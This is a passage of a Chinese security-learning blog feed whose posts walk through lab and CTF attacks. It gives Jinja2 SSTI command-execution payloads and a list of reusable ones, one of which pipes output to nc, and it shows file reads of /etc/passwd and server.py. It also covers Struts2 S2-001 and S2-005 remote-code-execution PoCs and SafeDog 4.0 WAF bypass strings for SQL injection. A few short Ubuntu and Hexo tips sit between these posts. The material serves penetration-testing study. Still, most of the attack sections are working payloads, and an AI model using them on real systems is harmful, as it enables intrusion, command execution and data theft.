<li><p><code>__init__</code>        初始化类</p>
</li>
<li><p><code>__builtins__</code>     可以利用<code>__import__</code> <code>eval</code>执行命令</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()</span><br></pre></td></tr></table></figure>
<br>

<p><code>&#39;&#39;.__class__.__mro__[-1]</code>为<code>&lt;class &#39;object&#39;&gt;</code></p>
<p>python中的类都是继承object的，所以要调用object类的<code>__subclasses__()</code>去得到我们想要使用的类的对象，</p>
<br>

<p>利用ssti要做的主要为两点</p>
<ul>
<li>读取文件内容</li>
<li>执行命令</li>
</ul>
<p>那只需要去寻找 os/file等关键字</p>
<p>一般都是使用object类下的 <code>&lt;class &#39;os._wrap_close&#39;&gt;</code>的<code>popen</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[:<span class="number">200</span>]):</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="vulhub上的flask-ssti"><a href="#vulhub上的flask-ssti" class="headerlink" title="vulhub上的flask ssti"></a>vulhub上的flask ssti</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">&quot;Hello &quot;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<h4 id="关键语句"><a href="#关键语句" class="headerlink" title="关键语句"></a>关键语句</h4><p><code>t = Template(&quot;Hello &quot; + name)</code></p>
<p>利用get传参进入template，构造注入语句</p>
<h4 id="验证语句"><a href="#验证语句" class="headerlink" title="验证语句"></a>验证语句</h4><p><img src="/posts/83c81c44/ssti1.png"></p>
<p><img src="/posts/83c81c44/ssti2.png"></p>
<p><img src="/posts/83c81c44/ssti3.png"></p>
<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p><code>t = Template(&quot;Hello &quot; + &#123;&#123;defense&#125;&#125;)</code></p>
<h4 id="官方POC"><a href="#官方POC" class="headerlink" title="官方POC"></a>官方POC</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><code>Hello uid=33(www-data) gid=33(www-data) groups=33(www-data) </code></p>
<hr>
<h3 id="buuoj-ssti"><a href="#buuoj-ssti" class="headerlink" title="buuoj ssti"></a>buuoj ssti</h3><p><img src="/posts/83c81c44/buuoj1.png"></p>
<p>可以判断是flask jinja2 的模板    (如果返回的是25 则是Twig模板)</p>
<p><img src="/posts/83c81c44/buuoj2.png"></p>
<p><img src="/posts/83c81c44/buuoj3.png"></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__&#125;&#125;</code></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1]&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj4.png"></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__.__subclasses__()&#125;&#125;</code>或者</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()&#125;&#125;</code>获取object的可以利用的类</p>
<p><img src="/posts/83c81c44/buuoj5.png"></p>
<p>使用脚本遍历找到利用的类</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127]&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj6.png"></p>
<p>利用<code>.__init__.__globals__</code>来找os类下的，<code>__init__</code>初始化类，然后<code>__globals__</code>全局来查找所有的方法及变量及参数</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj7.png"></p>
<p>利用<code>popen</code>去读取文件</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[%27popen%27](%27dir%27).read()&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj8.png"></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[%27popen%27](%27ls%27).read()&#125;&#125;</code></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[127].__init__.__globals__.__builtins__[%27eval%27]("__import__(%27os%27).popen(%27ls%27).read()")&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj9.png"></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[%27popen%27](%27whoami%27).read()&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj10.png"></p>
<p>看看/app下面有什么内容</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[127].__init__.__globals__[%27popen%27](%27ls%20/app%27).read()&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj11.png"></p>
<p>看看server.py</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[127].__init__.__globals__[%27popen%27](%27cat%20/app/server.py%27).read()&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj12.png"></p>
<p>得到flag <code>n1book&#123;eddb84d69a421a82&#125; </code></p>
<br>

<hr>
<h3 id="可能会用到的payload"><a href="#可能会用到的payload" class="headerlink" title="可能会用到的payload"></a>可能会用到的payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[127].__init__.__globals__[&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[127].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;popen&#39;](&#39;ls &#x2F;app&#39;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;__builtins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__imp&#39;+&#39;ort__(&quot;os&quot;).po&#39;+&#39;pen(&quot;ls .&#x2F;&quot;).read()&#39;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[138].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls | nc 127.0.0.1 1234&#39;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[138].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls  &#x2F;var&#x2F;www&#x2F;html&quot;).read()&#39; )</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;request[&#39;__cl&#39;+&#39;ass__&#39;].__base__.__base__.__base__[&#39;__subcla&#39;+&#39;sses__&#39;]()[60][&#39;__in&#39;+&#39;it__&#39;][&#39;__&#39;+&#39;glo&#39;+&#39;bal&#39;+&#39;s__&#39;][&#39;__bu&#39;+&#39;iltins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__im&#39;+&#39;port__(&quot;os&quot;).po&#39;+&#39;pen(&quot;ca&quot;+&quot;t a.php&quot;).re&#39;+&#39;ad()&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p> 如果过滤了[]等括号  </p>
<p>  使用 <code>__gititem__</code></p>
<p><code>&#123;&#123;%27%27.__class__.__bases__[0]&#125;&#125; </code>       –&gt;      <code> &#123;&#123;%27%27.__class__.__bases__.__getitem__(0)&#125;&#125;</code></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://blog.csdn.net/weixin_45669205/article/details/114373785">https://blog.csdn.net/weixin_45669205/article/details/114373785</a></p>
<p><a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
<p><a href="http://www.cl4y.top/ssti%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5%e5%ad%a6%e4%b9%a0/">http://www.cl4y.top/ssti%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5%e5%ad%a6%e4%b9%a0/</a></p>
<p><a href="https://www.cnblogs.com/Xy--1/p/12841941.html">https://www.cnblogs.com/Xy--1/p/12841941.html</a></p>
<p><a href="http://ctf.ieki.xyz/library/ssti.html">http://ctf.ieki.xyz/library/ssti.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>ssti</category>
      </categories>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu安装pip2</title>
    <url>/posts/2a2a2884/</url>
    <content><![CDATA[<br>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">启用 universe 源仓库</span><br><span class="line">sudo add-apt-repository universe</span><br><span class="line"></span><br><span class="line">sudo proxychains4 wget https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;pip&#x2F;2.7&#x2F;get-pip.py </span><br><span class="line"></span><br><span class="line">sudo python2 get-pip.py</span><br><span class="line"></span><br><span class="line">pip2 -V</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu_apt-get安装时报错</title>
    <url>/posts/e46255d2/</url>
    <content><![CDATA[<br>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;</span><br><span class="line">sudo mv info&#x2F; info_bak          # 现将info文件夹更名</span><br><span class="line">sudo mkdir info                 # 再新建一个新的info文件夹</span><br><span class="line">sudo apt-get update             # 更新</span><br><span class="line">sudo apt-get -f install         # 修复</span><br><span class="line">sudo mv info&#x2F;* info_bak&#x2F;        # 执行完上一步操作后会在新的info文件夹下生成一些文件，现将这些文件全部移到info_bak文件夹下</span><br><span class="line">sudo rm -rf info                # 把自己新建的info文件夹删掉</span><br><span class="line">sudo mv info_bak info           # 把以前的info文件夹重新改回名</span><br></pre></td></tr></table></figure>

<br>

<p><code>Reference</code></p>
<blockquote>
</blockquote>
]]></content>
      <categories>
        <category>apt-get</category>
      </categories>
      <tags>
        <tag>apt-get</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2复现s2-005</title>
    <url>/posts/9e0365e7/</url>
    <content><![CDATA[<h3 id="S2-005复现"><a href="#S2-005复现" class="headerlink" title="S2-005复现"></a>S2-005复现</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>修复S2-003时存在绕过，S2-003对# 过滤时忽略了Unicode编码，可以使用\u0023或者八进制进行绕过</p>
<br>
####  环境准备

<p><code>docker-compose up -d</code></p>
<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><h4 id="原始POC"><a href="#原始POC" class="headerlink" title="原始POC"></a>原始POC</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&#39;\u0023_memberAccess[\&#39;allowStaticMethodAccess\&#39;]&#39;)(vaaa)&#x3D;true</span><br><span class="line">&amp;(aaaa)((&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003d\u0023vccc&#39;)(\u0023vccc\u003dnew java.lang.Boolean(&quot;false&quot;)))</span><br><span class="line">&amp;(asdf)((&#39;\u0023rt.exec(&quot;calc&quot;)&#39;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))&#x3D;1</span><br></pre></td></tr></table></figure>
<p>解码后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&#39;#_memberAccess[\&#39;allowStaticMethodAccess\&#39;]&#39;)(vaaa)&#x3D;true</span><br><span class="line">&#x2F;&#x2F;设置allowStaticMethodAccess为true，开启后就可以执行静态方法 (vaaa)为遵循ognl语法树规则</span><br><span class="line">&amp;(aaaa)((&#39;#context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]&#x3D;#vccc&#39;)(#vccc&#x3D;new java.lang.Boolean(&quot;false&quot;)))</span><br><span class="line">&#x2F;&#x2F;设置denyMethodExecution为false 允许ognl自定义变量</span><br><span class="line">&amp;(asdf)((&#39;#rt.exec(&quot;calc&quot;)&#39;)(#rt&#x3D;@java.lang.Runtime@getRuntime()))&#x3D;1</span><br><span class="line">&#x2F;&#x2F;执行 calc 系统命令</span><br></pre></td></tr></table></figure>
<p>whoami POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(%27%5c43_memberAccess.allowStaticMethodAccess%27)(a)&#x3D;true</span><br><span class="line">&amp;(b)((%27%5c43context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5c75false%27)(b))</span><br><span class="line">&amp;(%27%5c43c%27)((%27%5c43_memberAccess.excludeProperties%5c75@java.util.Collections@EMPTY_SET%27)(c))</span><br><span class="line">&amp;(g)((%27%5c43mycmd%5c75%5c%27whoami%5c%27%27)(d))</span><br><span class="line">&amp;(h)((%27%5c43myret%5c75@java.lang.Runtime@getRuntime().exec(%5c43mycmd)%27)(d))&amp;(i)((%27%5c43mydat%5c75new%5c40java.io.DataInputStream(%5c43myret.getInputStream())%27)(d))&amp;(j)((%27%5c43myres%5c75new%5c40byte[51020]%27)(d))&amp;(k)((%27%5c43mydat.readFully(%5c43myres)%27)(d))&amp;(l)((%27%5c43mystr%5c75new%5c40java.lang.String(%5c43myres)%27)(d))&amp;(m)((%27%5c43myout%5c75@org.apache.struts2.ServletActionContext@getResponse()%27)(d))&amp;(n)((%27%5c43myout.getWriter().println(%5c43mystr)%27)(d))</span><br></pre></td></tr></table></figure>
<h4 id="关闭环境"><a href="#关闭环境" class="headerlink" title="关闭环境"></a>关闭环境</h4><p><code>docker-compose down -v</code></p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="http://b1ue.cn/archives/107.html">http://b1ue.cn/archives/107.html</a></p>
<p><a href="https://xz.aliyun.com/t/7966#toc-0">https://xz.aliyun.com/t/7966#toc-0</a></p>
<p><a href="https://blog.csdn.net/u011721501/article/details/41626959">https://blog.csdn.net/u011721501/article/details/41626959</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Struts2</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2复现s2-001</title>
    <url>/posts/996ea1fe/</url>
    <content><![CDATA[<h3 id="S2-001复现"><a href="#S2-001复现" class="headerlink" title="S2-001复现"></a>S2-001复现</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>用户提交表单数据验证失败后，后端会使用OGNL表达式%{value}对输入的参数进行解析,从而造成命令执行</p>
<h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><p><code>cd s2-001</code></p>
<p><code>docker-compose build</code></p>
<p><code>docker-compose up -d</code></p>
<p><code>docekr ps</code>查看是否启动成功</p>
<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>访问192.168.159.128:8080</p>
<p><img src="/posts/996ea1fe/001-1.PNG"></p>
<p>输入<code>%&#123;1+23&#125;</code>得到结果为24 可以判断存在远程代码执行</p>
<p><img src="/posts/996ea1fe/001-2.PNG"></p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p><code>%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></p>
<p>将<code>pwd</code>换成对应命令即可执行</p>
<br>

<p>获取web路径POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#req&#x3D;@org.apache.struts2.ServletActionContext@getRequest(),</span><br><span class="line"></span><br><span class="line">#response&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line"></span><br><span class="line">#response.println(#req.getRealPath(&#39;&#x2F;&#39;)),</span><br><span class="line"></span><br><span class="line">#response.flush(),</span><br><span class="line"></span><br><span class="line">#response.close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/996ea1fe/001-3.PNG"></p>
<p>查看权限whoami POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line"></span><br><span class="line">#b&#x3D;#a.getInputStream(),</span><br><span class="line"></span><br><span class="line">#c&#x3D;new java.io.InputStreamReader(#b),</span><br><span class="line"></span><br><span class="line">#d&#x3D;new java.io.BufferedReader(#c),</span><br><span class="line"></span><br><span class="line">#e&#x3D;new char[50000],</span><br><span class="line"></span><br><span class="line">#d.read(#e),</span><br><span class="line"></span><br><span class="line">#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line"></span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line"></span><br><span class="line">#f.getWriter().flush(),#f.getWriter().close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/996ea1fe/001-4.PNG"></p>
<p><code>cat /etc/passwd</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;&#x2F;etc&#x2F;passwd&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line"></span><br><span class="line">#b&#x3D;#a.getInputStream(),</span><br><span class="line"></span><br><span class="line">#c&#x3D;new java.io.InputStreamReader(#b),</span><br><span class="line"></span><br><span class="line">#d&#x3D;new java.io.BufferedReader(#c),</span><br><span class="line"></span><br><span class="line">#e&#x3D;new char[50000],#d.read(#e),</span><br><span class="line"></span><br><span class="line">#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line"></span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line"></span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line"></span><br><span class="line">#f.getWriter().close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/996ea1fe/001-5.PNG"></p>
<h4 id="关闭环境"><a href="#关闭环境" class="headerlink" title="关闭环境"></a>关闭环境</h4><p><code>docker-compose down -v</code></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p> <a href="https://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/">https://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/</a></p>
<p><a href="https://xz.aliyun.com/t/2672#toc-0">https://xz.aliyun.com/t/2672#toc-0</a></p>
<p><a href="https://www.freebuf.com/vuls/246768.html">https://www.freebuf.com/vuls/246768.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Struts2</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo设置多个标签或分类</title>
    <url>/posts/d7c641b4/</url>
    <content><![CDATA[<p><code>tag: [tag1,tag2,tag3]</code><br><code>categories: [categories1,categories2,categories3]</code></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>安全狗4.0 sqli绕过</title>
    <url>/posts/d405928/</url>
    <content><![CDATA[<h4 id="and-1-1-绕过"><a href="#and-1-1-绕过" class="headerlink" title="and 1=1 绕过"></a>and 1=1 绕过</h4><p><img src="/posts/d405928/1.png"></p>
<p>正常使用 <code>?id=tom&#39; and 1=1 --+</code>会被拦截<br><img src="/posts/d405928/2.png"></p>
<h5 id="使用-amp-amp-替换and"><a href="#使用-amp-amp-替换and" class="headerlink" title="使用&amp;&amp;替换and"></a>使用<code>&amp;&amp;</code>替换and</h5><p><img src="/posts/d405928/3.png"><br>无法绕过</p>
<h5 id="使用内联注释-！11440"><a href="#使用内联注释-！11440" class="headerlink" title="使用内联注释/*！11440 */"></a>使用内联注释<code>/*！11440 */</code></h5><p><img src="/posts/d405928/4.png"></p>
<p><img src="/posts/d405928/8.png"><br>可以绕过<br><br></p>
<h5 id="继续使用and"><a href="#继续使用and" class="headerlink" title="继续使用and"></a>继续使用and</h5><p>and 0x1</p>
<p>可以使用十六进制绕过</p>
<br>
##### http参数污染

<p><img src="/posts/d405928/14.png"><br><br></p>
<hr>
<br>

<br>

<h4 id="order-by绕过"><a href="#order-by绕过" class="headerlink" title="order by绕过"></a>order by绕过</h4><h5 id="使用换行符和注释绕过"><a href="#使用换行符和注释绕过" class="headerlink" title="使用换行符和注释绕过"></a>使用换行符和注释绕过</h5><p><code>?name=tom&#39;/**/order/*/%0A*/by/**/3%23</code></p>
<p><img src="/posts/d405928/6.png"><br><img src="/posts/d405928/7.png"></p>
<h5 id="使用http参数污染"><a href="#使用http参数污染" class="headerlink" title="使用http参数污染"></a>使用http参数污染</h5><p><code>name=tom1&#39; /*&amp;name=tom&#39; order by 3%23*/</code><br><img src="http1.png"><br><img src="http2.png"></p>
<br>

<hr>
<h4 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h4><h5 id="内联注入"><a href="#内联注入" class="headerlink" title="内联注入"></a>内联注入</h5><p>尝试使用<code>?id=tom&#39; union/*!11440select*/ 1,2,3 --+</code></p>
<p>fuzz跑了下10000-99999都无法绕过</p>
<p><img src="/posts/d405928/5.png"></p>
<br>

<h5 id="换行符-注释"><a href="#换行符-注释" class="headerlink" title="换行符+注释"></a>换行符+注释</h5><p><img src="/posts/d405928/9.png"></p>
<p>无法绕过</p>
<br>

<h5 id="内联注释-换行符"><a href="#内联注释-换行符" class="headerlink" title="内联注释+换行符"></a>内联注释+换行符</h5><p><img src="/posts/d405928/10.png"></p>
<p><code>tom%27/**/union/*!§10440§asd*//*!%0a*/select/**/1,2,3%20--+</code></p>
<p>fuzz一下，发现91625以后的都可以绕过</p>
<p><img src="/posts/d405928/11.png"></p>
<p><img src="/posts/d405928/12.png"></p>
<h5 id="http参数污染"><a href="#http参数污染" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom1&#39; union select 1,2,3%23*/</code></p>
<p><img src="http3.png"></p>
<p><img src="http4.png"></p>
<br>

<hr>
<h5 id="database-、user-绕过"><a href="#database-、user-绕过" class="headerlink" title="database()、user()绕过"></a>database()、user()绕过</h5><p><code>databse/*!91624*/()`` </code>user/!<em>99999</em>/()``</p>
<br>

<p>这里也可以通过内联注释 中间数字没试 随便输入了几个</p>
<p><img src="/posts/d405928/13.png"></p>
<br>

<hr>
<h4 id="information-schema绕过"><a href="#information-schema绕过" class="headerlink" title="information_schema绕过"></a>information_schema绕过</h4><h5 id="使用内联注释-fuzz"><a href="#使用内联注释-fuzz" class="headerlink" title="使用内联注释+fuzz"></a>使用内联注释+fuzz</h5><p>没绕过</p>
<h5 id="利用http参数污染"><a href="#利用http参数污染" class="headerlink" title="利用http参数污染"></a>利用http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom1&#39; union select 1,(select table_name from information_schema.tables where table_schema=database() limit 0,1),user()%23*/</code></p>
<p><img src="http5.png"></p>
<br>

<hr>
<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="内联注释-fuzz"><a href="#内联注释-fuzz" class="headerlink" title="内联注释+fuzz"></a>内联注释+fuzz</h5><p>updatexml</p>
<p>无waf情况下</p>
<p><img src="/posts/d405928/baocuo1.png"></p>
<p>开启安全狗</p>
<p><img src="/posts/d405928/baocuo2.png"></p>
<p>updataxml()会被拦截，中间加内联注释可以绕过</p>
<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select database/*!99999*/()),0x7e),1) --+</code></p>
<p><img src="/posts/d405928/baocuo3.png"></p>
<p>但是</p>
<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select/*!99999aaa*/database/*!99999*/()),0x7e),1) --+</code>会被拦截</p>
<p>测试了下 <code>select from ...</code> 后面加东西就会被拦截</p>
<p>在from 后面添加 <code>%23%0a</code>可以绕过</p>
<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select name from%23%0A%20 test ),0x7e),1) --+</code></p>
<p><img src="/posts/d405928/baocuo4.png"></p>
<br>

<h5 id="http参数污染-1"><a href="#http参数污染-1" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)%23*/</code></p>
<p><img src="http6.png"></p>
<p><img src="http7.png"></p>
<br>

<hr>
<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="http参数污染-2"><a href="#http参数污染-2" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><img src="http_sleep.png"></p>
<p><img src="/posts/d405928/bool1.png"> </p>
<p><img src="/posts/d405928/bool2.png"></p>
<br>

<br>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在此版本的安全狗(4.0.23.13)中，利用<strong>http参数污染</strong>都可以绕过</p>
